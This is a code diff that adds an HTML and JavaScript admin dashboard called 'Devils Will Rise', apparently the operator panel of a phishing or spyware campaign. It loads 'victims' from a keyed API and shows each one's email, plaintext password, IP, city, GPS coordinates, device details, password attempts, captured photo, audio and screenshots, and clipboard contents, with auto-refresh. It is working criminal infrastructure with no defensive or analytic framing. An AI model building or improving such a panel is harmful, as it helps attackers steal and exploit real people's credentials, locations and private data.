@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Devils Will Rise — Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto','Google Sans',Arial,sans-serif;}
+  body{background:#0a0a0a;color:#e8eaed;min-height:100vh;}
+  .header{background:#1a1a1a;border-bottom:1px solid #2d2e30;padding:20px 32px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10;}
+  .header h1{font-family:'Google Sans';font-size:22px;font-weight:500;color:#8ab4f8;}
+  .header h1 span{color:#f28b82;}
+  .header .meta{font-size:12px;color:#9aa0a6;}
+  .container{max-width:1400px;margin:0 auto;padding:32px;}
+  .key-box{background:#1a1a1a;border:1px solid #2d2e30;border-radius:12px;padding:24px;margin-bottom:24px;}
+  .key-box label{font-size:13px;color:#9aa0a6;display:block;margin-bottom:8px;}
+  .key-row{display:flex;gap:12px;flex-wrap:wrap;}
+  .key-row input{flex:1;min-width:200px;background:#0a0a0a;border:1px solid #3c4043;border-radius:8px;padding:12px 16px;color:#e8eaed;font-size:14px;outline:none;}
+  .key-row input:focus{border-color:#8ab4f8;}
+  .key-row button{background:#8ab4f8;color:#202124;border:none;border-radius:8px;padding:12px 28px;font-size:14px;font-weight:500;cursor:pointer;transition:background .15s;}
+  .key-row button:hover{background:#aecbfa;}
+  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin-bottom:24px;}
+  .stat{background:#1a1a1a;border:1px solid #2d2e30;border-radius:12px;padding:20px;transition:border-color .15s;}
+  .stat:hover{border-color:#8ab4f8;}
+  .stat .num{font-size:28px;font-weight:500;color:#8ab4f8;font-family:'Google Sans';margin-bottom:4px;}
+  .stat .lbl{font-size:12px;color:#9aa0a6;text-transform:uppercase;letter-spacing:1px;}
+  .table-wrap{background:#1a1a1a;border:1px solid #2d2e30;border-radius:12px;overflow:hidden;}
+  table{width:100%;border-collapse:collapse;}
+  thead{background:#0f0f0f;}
+  th{text-align:left;padding:14px 16px;font-size:12px;font-weight:500;color:#9aa0a6;text-transform:uppercase;letter-spacing:.8px;border-bottom:1px solid #2d2e30;}
+  td{padding:14px 16px;font-size:13px;border-bottom:1px solid #1f1f1f;color:#e8eaed;}
+  tr:last-child td{border-bottom:none;}
+  tr:hover{background:#1f1f1f;}
+  .chip{display:inline-block;padding:3px 10px;border-radius:100px;font-size:11px;font-weight:500;}
+  .chip.green{background:rgba(129,201,149,.15);color:#81c995;}
+  .chip.red{background:rgba(242,139,130,.15);color:#f28b82;}
+  .chip.blue{background:rgba(138,180,248,.15);color:#8ab4f8;}
+  .chip.yellow{background:rgba(253,214,99,.15);color:#fdd663;}
+  .empty{text-align:center;padding:64px 24px;color:#9aa0a6;font-size:14px;}
+  .empty .icon{font-size:48px;margin-bottom:16px;opacity:.3;}
+  .loader{display:inline-block;width:16px;height:16px;border:2px solid rgba(138,180,248,.2);border-top-color:#8ab4f8;border-radius:50%;animation:spin .7s linear infinite;}
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .detail-row{display:none;background:#0f0f0f;}
+  .detail-row.show{display:table-row;}
+  .detail-cell{padding:20px !important;border-bottom:1px solid #2d2e30 !important;}
+  .detail-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;}
+  .detail-item{padding:12px;background:#1a1a1a;border-radius:8px;border-left:3px solid #8ab4f8;}
+  .detail-item .lbl{font-size:11px;color:#9aa0a6;text-transform:uppercase;letter-spacing:.8px;margin-bottom:4px;}
+  .detail-item .val{font-size:13px;color:#e8eaed;word-break:break-all;}
+  .detail-item .val code{background:#0a0a0a;padding:2px 6px;border-radius:4px;font-family:monospace;font-size:12px;color:#8ab4f8;}
+  .detail-item a{color:#8ab4f8;text-decoration:none;}
+  .detail-item a:hover{text-decoration:underline;}
+  .expand-btn{background:transparent;border:1px solid #5f6368;color:#8ab4f8;border-radius:6px;padding:4px 12px;font-size:12px;cursor:pointer;transition:background .15s;}
+  .expand-btn:hover{background:rgba(138,180,248,.1);}
+  @media (max-width:600px){
+    .container{padding:16px;}
+    .header{padding:16px 20px;}
+    .header h1{font-size:18px;}
+    th,td{padding:10px 12px;font-size:12px;}
+    .stat .num{font-size:22px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>💀 DEVILS <span>WILL RISE</span></h1>
+  <div class="meta">👤 @tneh_owner · 📡 @customsmsapi</div>
+</div>
+
+<div class="container">
+  <div class="key-box">
+    <label>🔑 Dashboard Access Key</label>
+    <div class="key-row">
+      <input type="password" id="dashKey" placeholder="Enter access key..." value="">
+      <button onclick="loadVictims()">Load Victims</button>
+      <button onclick="loadVictims(true)" style="background:#2d2e30;color:#8ab4f8;">🔄 Auto-Refresh</button>
+    </div>
+  </div>
+
+  <div class="stats" id="stats" style="display:none;">
+    <div class="stat"><div class="num" id="statTotal">0</div><div class="lbl">Total Victims</div></div>
+    <div class="stat"><div class="num" id="statEmail">0</div><div class="lbl">Emails</div></div>
+    <div class="stat"><div class="num" id="statPass">0</div><div class="lbl">Passwords</div></div>
+    <div class="stat"><div class="num" id="statGps">0</div><div class="lbl">GPS</div></div>
+    <div class="stat"><div class="num" id="statMedia">0</div><div class="lbl">Media</div></div>
+  </div>
+
+  <div class="table-wrap" id="tableWrap" style="display:none;">
+    <table>
+      <thead>
+        <tr>
+          <th>Victim ID</th>
+          <th>Email</th>
+          <th>Password</th>
+          <th>Location</th>
+          <th>IP</th>
+          <th>Time</th>
+          <th></th>
+        </tr>
+      </thead>
+      <tbody id="victimBody"></tbody>
+    </table>
+  </div>
+
+  <div class="empty" id="emptyState">
+    <div class="icon">🔒</div>
+    <div>Enter the dashboard key and click <b>Load Victims</b></div>
+  </div>
+</div>
+
+<script>
+let refreshInterval = null;
+
+async function loadVictims(autoRefresh=false){
+  const key = document.getElementById('dashKey').value.trim();
+  if(!key){
+    alert('Enter dashboard key');
+    return;
+  }
+
+  try{
+    const r = await fetch(`/api/victims?key=${encodeURIComponent(key)}`);
+    const data = await r.json();
+
+    if(!data.ok){
+      alert('Error: ' + (data.error || 'Unauthorized'));
+      return;
+    }
+
+    renderVictims(data.victims);
+
+    if(autoRefresh){
+      if(refreshInterval) clearInterval(refreshInterval);
+      refreshInterval = setInterval(()=>{
+        loadVictims(true);
+      }, 5000);
+    }
+  }catch(e){
+    alert('Failed: ' + e.message);
+  }
+}
+
+function renderVictims(list){
+  const stats = document.getElementById('stats');
+  const tableWrap = document.getElementById('tableWrap');
+  const empty = document.getElementById('emptyState');
+  const tbody = document.getElementById('victimBody');
+
+  document.getElementById('statTotal').textContent = list.length;
+  document.getElementById('statEmail').textContent = list.filter(v=>v.email).length;
+  document.getElementById('statPass').textContent = list.filter(v=>v.password).length;
+  document.getElementById('statGps').textContent = list.filter(v=>v.gps).length;
+  document.getElementById('statMedia').textContent = list.filter(v=>v.photo||v.audio||v.screenshot).length;
+
+  stats.style.display = 'grid';
+
+  if(list.length === 0){
+    tableWrap.style.display = 'none';
+    empty.style.display = 'block';
+    empty.innerHTML = '<div class="icon">📭</div><div>No victims captured yet</div>';
+    return;
+  }
+
+  tableWrap.style.display = 'block';
+  empty.style.display = 'none';
+  tbody.innerHTML = '';
+
+  list.forEach(v=>{
+    const rowId = 'row-' + v.victimId;
+    const detailId = 'detail-' + v.victimId;
+    const g = v.geo || {};
+    const location = [g.city, g.country].filter(Boolean).join(', ') || '—';
+
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td><span class="chip blue">${v.victimId}</span></td>
+      <td>${v.email || '—'}</td>
+      <td>${v.password ? '<span class="chip green">✔ ' + maskPass(v.password) + '</span>' : '<span class="chip red">✖</span>'}</td>
+      <td>${location}</td>
+      <td><code style="background:#0a0a0a;padding:2px 6px;border-radius:4px;font-size:11px;">${v.ip || '—'}</code></td>
+      <td>${v.emailTime || '—'}</td>
+      <td><button class="expand-btn" onclick="toggleDetail('${detailId}')">Details</button></td>
+    `;
+    tbody.appendChild(row);
+
+    const detailRow = document.createElement('tr');
+    detailRow.className = 'detail-row';
+    detailRow.id = detailId;
+    detailRow.innerHTML = `
+      <td colspan="7" class="detail-cell">
+        <div class="detail-grid">
+          <div class="detail-item"><div class="lbl">Email</div><div class="val">${v.email || '—'}</div></div>
+          <div class="detail-item"><div class="lbl">Password</div><div class="val"><code>${v.password || '—'}</code></div></div>
+          <div class="detail-item"><div class="lbl">IP Address</div><div class="val"><code>${v.ip || '—'}</code></div></div>
+          <div class="detail-item"><div class="lbl">City</div><div class="val">${g.city || '—'}</div></div>
+          <div class="detail-item"><div class="lbl">Region</div><div class="val">${g.region || '—'}</div></div>
+          <div class="detail-item"><div class="lbl">Country</div><div class="val">${g.country || '—'} ${g.cc ? '('+g.cc+')' : ''}</div></div>
+          <div class="detail-item"><div class="lbl">Postal</div><div class="val">${g.postal || '—'}</div></div>
+          <div class="detail-item"><div class="lbl">ISP</div><div class="val">${g.isp || '—'}</div></div>
+          <div class="detail-item"><div class="lbl">ASN</div><div class="val">${g.asn || '—'}</div></div>
+          <div class="detail-item"><div class="lbl">Timezone</div><div class="val">${g.timezone || '—'}</div></div>
+          ${v.gps ? `<div class="detail-item"><div class="lbl">GPS</div><div class="val"><a href="https://www.google.com/maps?q=${v.gps.lat},${v.gps.lon}" target="_blank">${v.gps.lat}, ${v.gps.lon}</a><br><small>Accuracy: ${v.gps.acc}m</small></div></div>` : ''}
+          <div class="detail-item"><div class="lbl">Device</div><div class="val">${v.device?.platform || '—'}<br><small>${v.device?.screen || ''}</small></div></div>
+          <div class="detail-item"><div class="lbl">Attempts</div><div class="val">${v.attempts?.length || 0} password tries</div></div>
+          <div class="detail-item"><div class="lbl">Media</div><div class="val">
+            ${v.photo ? '📸 Photo ' : ''}${v.audio ? '🎤 Audio ' : ''}${v.screenshot ? '🖼️ Screenshot' : ''}${!v.photo && !v.audio && !v.screenshot ? '—' : ''}
+          </div></div>
+          ${v.clipboard ? `<div class="detail-item" style="grid-column:1/-1;"><div class="lbl">Clipboard</div><div class="val"><code>${escapeHtml(v.clipboard)}</code></div></div>` : ''}
+        </div>
+      </td>
+    `;
+    tbody.appendChild(detailRow);
+  });
+}
+
+function toggleDetail(id){
+  const el = document.getElementById(id);
+  if(el) el.classList.toggle('show');
+}
+function maskPass(p){
+  if(!p) return '—';
+  if(p.length <= 3) return p;
+  return p.substring(0,2) + '•'.repeat(Math.min(p.length-2, 6));
+}
+function escapeHtml(s){
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+
+// Auto load if key in URL
+window.addEventListener('load', ()=>{
+  const params = new URLSearchParams(window.location.search);
+  const key = params.get('key');
+  if(key){
+    document.getElementById('dashKey').value = key;
+    loadVictims();
+  }
+});
+</script>
+</body>
+</html>
